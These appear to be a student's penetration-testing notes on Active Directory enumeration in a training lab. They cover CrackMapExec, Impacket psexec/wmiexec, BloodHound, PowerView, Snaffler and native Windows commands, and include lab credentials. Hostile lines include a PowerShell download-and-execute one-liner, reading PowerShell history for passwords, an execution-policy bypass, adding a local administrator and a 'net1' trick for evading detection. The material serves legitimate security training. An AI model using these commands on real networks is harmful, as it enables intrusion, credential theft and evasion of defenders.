# Enumerating Security Controls
- After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. 
- It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation.
## Windows Defender
- Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`. There are ways to bypass these protections.
- We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. Here, we can see that the `RealTimeProtectionEnabled` parameter is set to `True`, which means Defender is enabled on the system.
#### Checking the Status of Defender with Get-MpComputerStatus
```powershell-session
PS C:\htb> Get-MpComputerStatus
```
- If giving error check if windows defender is active or not `(Get-Service windefend).Status`
## AppLocker
- An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.
-  The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
- [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.
-  It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed.
- Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
#### Using Get-AppLockerPolicy cmdlet
```powershell-session
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
## LAPS
- The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.
#### Using Find-LAPSDelegatedGroups
```powershell-session
PS C:\htb> Find-LAPSDelegatedGroups
```
#### Using Find-AdmPwdExtendedRights
- The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
```powershell-session
PS C:\htb> Find-AdmPwdExtendedRights
```
#### Using Get-LAPSComputers
- We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
```powershell-session
PS C:\htb> Get-LAPSComputers
```

# Credentialed Enumeration - from Linux
## CrackMapExec
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME) is a powerful toolset to help with assessing AD environments.
#### CME - Domain User Enumeration
```shell-session
AnuragTaparia@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
#### CME - Domain Group Enumeration
```shell-session
	AnuragTaparia@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
#### CME - Logged On Users
```shell-session
AnuragTaparia@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
#### CME Share Searching
```shell-session
AnuragTaparia@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
#### Spider_plus
- The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.
```shell-session
AnuragTaparia@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
## SMBMap
- SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.
#### SMBMap To Check Access
```shell-session
AnuragTaparia@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
#### Recursive List Of All Directories
```shell-session
AnuragTaparia@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
## rpcclient
- While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:
	- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
	- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
	- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
	- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
- However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500. This will always be the case.
#### RPCClient User Enumeration By RID
```shell-session
rpcclient $> queryuser 0x457
```
## Impacket Toolkit
#### Psexec.py
- Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. 
- The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. 
- Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
#### Using psexec.py
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py
- Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). 
- It does not drop any files or executables on the target host and generates fewer logs than other modules. 
- After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). 
- This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems.
#### Using wmiexec.py
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## Bloodhound.py
- Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers.
-  The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files.
- The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.
#### Executing BloodHound.py
```shell-session
AnuragTaparia@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```
#### Upload the Zip File into the BloodHound GUI
- We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database
- Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown
- Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.
- Now that the data is loaded, we can use the Analysis tab to run queries against the database.

# Credentialed Enumeration - from Windows
## TTPs
- The first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.
## ActiveDirectory PowerShell Module
- The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
- Before we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. 
- This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.
#### Load ActiveDirectory Module
```powershell-session
PS C:\htb> Get-Module #To check if module is already installed or not
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```
### Get Domain Info
```powershell-session
PS C:\htb> Get-ADDomain
```
- This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet. 
- We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.
#### Get-ADUser
```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
- Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet
#### Checking For Trust Relationships
```powershell-session
PS C:\htb> Get-ADTrust -Filter *
```
- This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts.
#### Group Enumeration
```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name
```
#### Detailed Group Info
```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
### Group Membership
```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```


## PowerView 

**Overview**:  
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a PowerShell tool for obtaining situational awareness in Active Directory (AD) environments. It allows identification of user logins, domain structure enumeration, file share and password hunting, Kerberoasting, and more. Though requiring more manual analysis than BloodHound, it is highly effective for discovering AD misconfigurations.

---

### Key PowerView Commands

#### General Commands
- **Export-PowerViewCSV**: Append results to a CSV file.
- **ConvertTo-SID**: Convert a User or group name to its SID value.
- **Get-DomainSPNTicket**: Request the Kerberos ticket for a specified SPN account.

#### Domain/LDAP Functions
- **Get-Domain**: Returns the AD object for the current or specified domain.
- **Get-DomainController**: Lists Domain Controllers for the specified domain.
- **Get-DomainUser**: Retrieves user information for all or specified users.
- **Get-DomainComputer**: Retrieves information on all computers or specified computers in AD.
- **Get-DomainGroup**: Retrieves all groups or specific group information in AD.
- **Get-DomainOU**: Searches for specific Organizational Units (OUs) in AD.
- **Find-InterestingDomainAcl**: Identifies ACLs with modification rights set to non-standard objects.
- **Get-DomainGroupMember**: Returns members of a specific AD group.
- **Get-DomainFileServer**: Lists servers likely acting as file servers.
- **Get-DomainDFSShare**: Lists all distributed file systems for the current or specified domain.

#### Group Policy Object (GPO) Functions
- **Get-DomainGPO**: Lists all or specified GPOs in AD.
- **Get-DomainPolicy**: Retrieves default domain policy or domain controller policy.

#### Computer Enumeration Functions
- **Get-NetLocalGroup**: Enumerates local groups on local or remote machines.
- **Get-NetLocalGroupMember**: Enumerates members of a specific local group.
- **Get-NetShare**: Lists open shares on local or remote machines.
- **Get-NetSession**: Retrieves session information for local or remote machines.
- **Test-AdminAccess**: Tests administrative access on a local or remote machine.

#### Threaded 'Meta'-Functions
- **Find-DomainUserLocation**: Finds where specific users are logged in.
- **Find-DomainShare**: Finds accessible shares on domain machines.
- **Find-InterestingDomainShareFile**: Searches readable shares for files matching specific criteria.
- **Find-LocalAdminAccess**: Identifies machines where the current user has local admin access.

#### Domain Trust Functions
- **Get-DomainTrust**: Lists domain trusts for the current or specified domain.
- **Get-ForestTrust**: Lists all forest trusts for the current or specified forest.
- **Get-DomainForeignUser**: Enumerates users in groups outside their own domain.
- **Get-DomainForeignGroupMember**: Enumerates groups with members outside their domain.
- **Get-DomainTrustMapping**: Enumerates all trusts in the current domain and others it sees.

---

### Examples of PowerView Commands in Use

#### Example 1: Get-DomainUser
Retrieve detailed user information.
```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

**Output Summary**:
- **Name**: Matthew Morgan
- **Account Expires**: NEVER
- **Admin Count**: 1
- **User Account Control**: NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

#### Example 2: Recursive Group Membership
Lists all members of "Domain Admins," including nested group members.
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

**Output Summary**:
- Shows members with elevated permissions, useful for privilege escalation identification.

#### Example 3: Trust Enumeration
Enumerates domain trusts within the environment.
```powershell
Get-DomainTrustMapping
```

**Output Summary**:
- **Trust Direction**: Bidirectional
- **Trust Attributes**: WITHIN_FOREST, FOREST_TRANSITIVE

#### Example 4: Test-AdminAccess
Tests if the current user has administrative rights on a specified host.
```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

**Output Summary**:
- Indicates administrative privileges on the target machine.

#### Example 5: Finding Users with SPN Set (Kerberoasting Target Identification)
Identifies users with SPN attributes set, which may be vulnerable to Kerberoasting.
```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

**Output Summary**:
- **ServicePrincipalName**: adfsconnect/azure01.inlanefreight.local
- **SamAccountName**: adfs, backupagent, d0wngrade, krbtgt, sqldev, sqlprod, etc.

---

**Note**: PowerView functions offer substantial flexibility for detailed AD enumeration. Use cases include user enumeration, trust mapping, privilege identification, and Kerberoasting preparation.
## BloodHound
**Overview**:  
BloodHound is an open-source tool for identifying attack paths in an AD environment by mapping relationships between AD objects. Its powerful visualization can uncover difficult-to-detect flaws that have existed in the domain for years, making it valuable for both offensive and defensive security teams.

### SharpHound - Data Collection for BloodHound

#### Running SharpHound
SharpHound.exe, BloodHound’s data collection tool, can be run from a Windows attack host. To see available options:
```powershell
.\SharpHound.exe --help
```

**Example Options**:
- **-c, --collectionmethods**: Sets collection methods (e.g., Group, LocalGroup, ACL).
- **-d, --domain**: Specifies domain for enumeration.
- **--stealth**: Enables stealth collection (DCOnly mode recommended).
- **-f**: Adds an LDAP filter to a predefined filter.

#### Example Execution of SharpHound
The following command performs comprehensive enumeration:
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

**Sample Output Summary**:
- Completes enumeration of AD objects in a specified timeframe.
- Generates a zip file for upload to the BloodHound GUI.

### Loading Data into BloodHound
1. **Upload Data**: Type `bloodhound` in PowerShell or CMD on the attack host, or open BloodHound on a local VM.
2. **Authenticate to Neo4j Database** (if prompted): `neo4j: HTB_@cademy_stdnt!`.
3. **Upload Dataset**: Use the "Upload Data" button to upload the `.zip` file from SharpHound.

---

### BloodHound Analysis - Common Queries

#### Domain Overview
- **Command**: `domain:INLANEFREIGHT.LOCAL` in the search bar to view nodes related to the domain.
- **Use Case**: Review node information and relationship structures within the AD environment.

#### Key Queries in BloodHound Analysis Tab

1. **Find Computers with Unsupported Operating Systems**
   - Identifies legacy systems like Windows 7 or Server 2008 that may be vulnerable to older exploits (e.g., MS08-067).
   - **Recommendation**: If identified, advise clients to segment these hosts or consider decommissioning.

2. **Find Computers Where Domain Users Are Local Admin**
   - Detects hosts where all domain users have local admin rights, which can expose the domain to compromise if any user account is compromised.
   - **Use Case**: Quick identification of accessible hosts for privilege escalation.

3. **Local Admins**
   - Identifies users with local admin rights on one or more hosts, useful for privilege escalation and credential theft.
   - **Consideration**: Excessive local admin privileges can make it easier to move laterally within a network.

#### Custom Cypher Queries
- **Use Case**: Craft specific Cypher queries in the "Raw Query" box to uncover tailored vulnerabilities or relationships.
- **Example**: Customize queries to search for paths between high-privilege users and sensitive systems.

---

**Notes**:  
BloodHound's visualization and query capabilities make it ideal for analyzing complex AD environments. Practice with pre-built queries and experiment with Cypher to find other AD weaknesses effectively. This can streamline vulnerability detection and help prioritize remediations in large domains.

For further study, check out the Active Directory Bloodhound module for advanced usage.

## Snaffler
### Snaffler Overview

**Purpose:**  
Snaffler is a tool designed for security assessments in an Active Directory (AD) environment, used to locate credentials and sensitive files across domain hosts.

**Functionality:**

1. Snaffler identifies hosts within a domain.
2. Enumerates each host for accessible shares and directories.
3. Searches for readable files that might improve the user’s access position in the domain.

**Requirements:**

- Snaffler must be run from a domain-joined host or a domain-user context.

---

### Command Execution

**Basic Command:**
```bash
`Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`
```
**Command Breakdown:**
- `-s`: Outputs results to the console.
- `-d`: Specifies the domain for the search.
- `-o`: Defines the log file for output.
- `-v`: Sets verbosity (recommended as `data` for essential output).

**Usage Tips:**

- Outputs a large volume of data; logging to a file (`-o`) is recommended for easier analysis.
- Console output is color-coded for quick identification of critical files.
- The output can serve as a valuable data source for penetration test reporting.

---

### Example Output Analysis

**Sample Execution in PowerShell:**

```powershell
PS C:\htb> .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
```
**Notable Entries in Output:**

- Shares and files are color-coded:
    - **{Black}**: Indicates standard files, such as `.kdb`, `.ppk`.
    - **{Red}**: Indicates sensitive files, such as `.key`, `.keychain`, `.mdf`.

Example of Detected Files:

- `\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key`
- `\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key`

**File Types of Interest:**

- SSH keys
- Password databases (`.kdb`, `.kwallet`)
- Configuration files
- Database dumps (`.sqldump`, `.mdf`)

---

### Next Steps

With data gathered from Snaffler:

1. Correlate findings to prioritize access points and identify sensitive areas.
2. Visualize and analyze data with BloodHound or similar tools for deeper AD-focused security assessments.

# Living Off the Land
## Scenario
- Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed.
- Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory.
## Env Commands For Host & Network Recon
#### Basic Enumeration Commands

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
- We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).
- The `systeminfo` command, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
## Harnessing PowerShell
- Let's look at a few of the ways PowerShell can help us.

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`          | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
### Checking Defenses
- The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
#### Firewall Checks
```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```
#### Windows Defender Check (from CMD.exe)
```cmd-session
C:\htb> sc query windefend
```
- Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.
#### Get-MpComputerStatus
```powershell-session
PS C:\htb> Get-MpComputerStatus
```
## Am I Alone?
- When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
#### Using qwinsta
```powershell-session
PS C:\htb> qwinsta
```
## Network Information

| **Networking Commands**        | **Description**                                                                                                  |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                       | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
```
Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
```
## Windows Management Instrumentation (WMI)

- [Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
- This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic
#### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
## Net Commands

- [Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI.
```
Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.
```
#### Table of Useful Net Commands

| **Command**                                     | **Description**                                                                                                              |     |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --- |
| `net accounts`                                  | Information about password requirements                                                                                      |     |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |     |
| `net group /domain`                             | Information about domain groups                                                                                              |     |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |     |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |     |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |     |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |     |
| `net groups /domain`                            | List of domain groups                                                                                                        |     |
| `net localgroup`                                | All available groups                                                                                                         |     |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |     |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |     |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |     |
| `net share`                                     | Check current shares                                                                                                         |     |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |     |
| `net user /domain`                              | List all users of the domain                                                                                                 |     |
| `net user %username%`                           | Information about the current user                                                                                           |     |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |     |
| `net view`                                      | Get a list of computers                                                                                                      |     |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |     |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |     |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |     |
#### Net Commands Trick

- If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

## Dsquery
- [Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. 
- With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.
#### User Search
```powershell-session
PS C:\htb> dsquery user
```
#### Computer Search
```powershell-session
PS C:\htb> dsquery computer
```
#### Wildcard Search
```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Get Disabled Users with Descriptions
```powershell-session
PS C:\htb> dsquery user -disabled | dsget user -dn -desc
```
